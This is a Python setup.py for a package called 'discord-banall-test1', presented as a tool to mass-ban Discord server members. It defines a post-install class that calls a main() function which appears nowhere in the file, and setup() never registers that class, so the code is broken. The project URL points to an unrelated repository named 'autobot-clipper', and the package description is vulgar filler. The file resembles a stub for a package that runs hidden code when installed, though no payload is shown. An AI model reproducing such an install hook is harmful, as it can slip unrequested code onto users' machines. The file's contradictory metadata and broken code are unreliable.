import setuptools
from setuptools.command.install import install

class AfterInstall(install):
    def run(self):
        install.run(self)
        main()

setuptools.setup(
    name = "discord-banall-test1",
    version = "1.0.4",
    author = "wessy",
    author_email = "2kstepping@gmail.com",
    description = "Discord banall pip package that makes it easier to banall members in a server.",
    long_description = "suck my cock, balls balls balls.",
    long_description_content_type = "text/markdown",
    url = "https://github.com/teja156/autobot-clipper",
    project_urls = {
        "Bug Tracker": "https://github.com/teja156/autobot-clipper/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
)